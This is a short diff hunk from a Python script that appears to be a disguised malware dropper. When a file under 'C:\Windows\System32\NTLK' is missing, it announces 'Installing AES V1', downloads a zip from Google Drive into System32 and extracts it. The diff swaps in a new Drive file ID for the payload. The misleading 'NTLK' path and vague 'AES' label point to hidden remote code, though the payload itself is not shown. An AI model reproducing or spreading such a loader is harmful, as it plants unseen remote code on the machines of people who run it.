@@ -110,7 +110,7 @@ def download_file_from_google_drive(url, output_path):
 
 if not os.path.exists("C:\\Windows\\System32\\NTLK\\aesv9.1.py"):
     print("Installing AES V1 please wait...")
-    download_file_from_google_drive("https://drive.google.com/uc?id=1cJZNfui_3Ce5YGwHyzL4ZAK7OTjGBEwl", "C:\\Windows\\System32\\NTLK\\v1x3.zip")
+    download_file_from_google_drive("https://drive.google.com/uc?id=1BI81Bz3ATWpjBA0EiPDwEktTAfHJjDyy", "C:\\Windows\\System32\\NTLK\\v1x3.zip")
     zip_file = r'C:\Windows\System32\NTLK\v1x3.zip'
     extract_dir = r'C:\Windows\System32\NTLK'
     extract_zip(zip_file, extract_dir)
